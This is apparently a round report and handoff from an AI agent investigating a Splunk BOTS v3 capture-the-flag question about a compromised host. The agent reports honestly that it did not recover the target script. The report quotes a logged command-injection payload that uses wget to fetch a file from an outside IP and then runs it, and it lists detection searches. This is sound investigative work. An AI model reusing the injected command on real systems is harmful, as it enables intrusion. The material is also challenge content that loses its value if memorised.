# s2 - Q328 - Round 3
_stamped by runner: rounds_remaining=1 novel_spl=2_
**Scope:** sourcetype=access_combined | source=/var/log/httpd/access_log,/var/log/apache2/access.log | fields=host,url,uri,path,filename,ping_ip,command,process,message
**Insight:** NOT_FOUND
**Candidate:** none   **Confidence:** 12

## Prior rounds
1. Bash history and linux audit/ps/osquery FIM had already established the likely file path on hoth.
2. osquery and syslog confirmed hoth and showed metadata-rich telemetry, but not the target script body.
3. Cron and package telemetry existed but did not surface a content-preserving copy.
4. Access_combined was identified as a promising artifact family because it preserves request parameters.
5. A preserved ping_ip parameter showed an injected shell command that downloads and executes /tmp/rz.
6. No verified line 2 text was recovered yet.

## This round
### What I ran
- `get_field_values(field="ping_ip", index="botsv3", sourcetype="access_combined", source="/var/log/httpd/access_log", top_n=20)` -> 1 event; ping_ip preserved `google.ca ; cd /tmp; wget http://178.128.11.199/rvs -O /tmp/rz; chmod 777 /tmp/rz; sh /tmp/rz`.
- `get_raw_events(..., keyword="ping_ip", limit=5)` -> 1 raw access line showing the luci nslookup exploit request.
- `get_raw_events(..., keyword="definitelydontinvestigatethisfile", limit=20)` -> 0 results.
- `get_raw_events(..., keyword="colonelnew", limit=20)` -> 0 results.
- `get_raw_events(..., keyword="tomcat8", limit=20)` -> 0 results.
- `get_raw_events(..., keyword="echo", limit=20)` -> 0 results.
- `run_splunk_search(...)` exact-path search for the script name in uri/url/filename/message -> 0 results.
- `run_splunk_search(...)` for wget/curl/echo/cat markers in ping_ip/uri -> 0 results.
### What it means
NOT_FOUND: access logs do preserve command parameters and show a web exploit that fetched and executed a payload, but I did not find any request parameter, file reference, or service log line that reproduces the contents of `/tmp/definitelydontinvestigatethisfile.sh`. The exact line 2 remains unrecovered.

## Ruled out
- Direct filename references in access_combined - no hit.
- colonelnew/tomcat8 access-log pivot terms - no hit in sampled/raw inspection.
- Obvious request-parameter write primitives (echo/curl/wget/cat) in the limited access-log evidence - not recovered.

## Open questions for SH
- If another scope is allowed later, should we pivot from the downloaded `/tmp/rz` payload chain toward the web endpoint it exploited, or toward any secondary logs that capture spawned process arguments on hoth?

_Iteration cap reached: 8/8 iterations used this round — cut off, not finished._


## What I'd tell my replacement
- Retired because: This senior tested alternative server/application logs on hoth, confirmed an exploit request that downloaded and executed /tmp/rz, but still did not recover any artifact preserving the contents of /tmp/definitelydontinvestigatethisfile.sh or its line 2. Handoff: retain hoth, tomcat8, suspicious `colonelnew`, likely escalation file `/tmp/definitelydontinvestigatethisfile.sh`, and the web exploit chain fetching `/tmp/rz` as related compromise context rather than proven script content.
- Scope I owned: sourcetypes=['osquery:info', 'osquery:results', 'syslog', 'errors', 'linux_secure', 'access_combined'] sources=['/var/log/osquery/osqueryd.INFO', '/var/log/syslog', '/var/log/messages', '/var/log/httpd/access_log', '/var/log/apache2/access.log'] fields=['host', 'message', 'path', 'cmdline', 'name', 'columns.*', '_raw']
- Rounds worked: 3/4  (iterations: 27, compactions: 0)
- SPL already run — do not repeat these, go one step further:
- index=botsv3 sourcetype=access_combined host=hoth | stats count by ping_ip, uri, uri_path, method, status | search ping_ip=*definitelydont* OR uri=*definitelydont* OR uri_path=*definitelydont*
- index=botsv3 sourcetype=access_combined source="/var/log/httpd/access_log" | stats count by ping_ip, uri, uri_path, url, filename, command, process, message | search ping_ip="*wget*" OR ping_ip="*curl*" OR ping_ip="*echo*" OR ping_ip="*cat*" OR uri="*wget*" OR uri="*curl*" OR uri="*echo*" OR uri="*cat*"
- index=botsv3 sourcetype=access_combined source="/var/log/httpd/access_log" | stats count by uri, uri_path, url, filename, ping_ip, command, process, message | search uri="*definitelydontinvestigatethisfile.sh*" OR uri_path="*definitelydontinvestigatethisfile.sh*" OR url="*definitelydontinvestigatethisfile.sh*" OR filename="*definitelydontinvestigatethisfile.sh*" OR message="*definitelydontinvestigatethisfile.sh*"
